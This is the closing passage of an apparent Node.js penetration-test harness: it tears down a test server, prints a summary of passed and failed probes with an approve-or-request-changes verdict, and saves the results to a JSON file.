  // Teardown server if spawned
  stopServer();

  // =========================================================================
  // SUMMARY REPORT
  // =========================================================================
  console.log(`${BOLD}${CYAN}=========================================================================${RESET}`);
  console.log(`${BOLD}${CYAN}                   PENETRATION TEST SUMMARY REPORT                       ${RESET}`);
  console.log(`${BOLD}${CYAN}=========================================================================${RESET}`);
  console.log(`  Total Probes Executed: ${results.summary.total}`);
  console.log(`  Probes Passed (Secure): ${GREEN}${results.summary.passed}${RESET}`);
  console.log(`  Probes Failed (Vulnerable): ${results.summary.failed > 0 ? RED : GREEN}${results.summary.failed}${RESET}`);

  const verdict = results.summary.failed === 0 ? 'APPROVE' : 'REQUEST_CHANGES';
  console.log(`  Verdict: ${verdict === 'APPROVE' ? GREEN + BOLD + 'APPROVE (SECURITY VERIFIED)' : RED + BOLD + 'REQUEST_CHANGES'}${RESET}`);
  console.log(`${BOLD}${CYAN}=========================================================================${RESET}\n`);

  results.verdict = verdict;

  // Save JSON report
  const jsonReportPath = path.join(__dirname, 'penetration_test_results.json');
  fs.writeFileSync(jsonReportPath, JSON.stringify(results, null, 2), 'utf8');
  console.log(`Detailed test report saved to: ${jsonReportPath}`);

  return results;
}

if (require.main === module) {
  runAllPenetrationTests().then((res) => {
    process.exit(res.summary.failed === 0 ? 0 : 1);
  }).catch((err) => {
    console.error('Fatal error during penetration tests:', err);
    stopServer();
    process.exit(1);
  });
}

module.exports = { runAllPenetrationTests };
